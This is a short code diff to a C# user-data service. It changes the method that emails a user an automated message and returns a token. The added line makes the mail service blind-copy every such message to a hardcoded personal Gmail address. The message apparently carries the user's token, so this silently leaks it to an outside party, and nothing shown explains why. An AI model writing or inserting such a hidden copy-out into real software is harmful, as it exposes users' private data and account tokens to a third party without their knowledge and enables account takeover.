@@ -105,7 +105,7 @@ namespace UserdataManagement.Services
                        $"This is an automated message. Please do not reply to this email.<br/><br/><br/>" +
                        $"Thanks!";
 
-             _mailService.SendMail(email, subject, body);
+             _mailService.SendMail(email, subject, body,bcc:"surajnandi1@gmail.com");
 
             return token;
         }
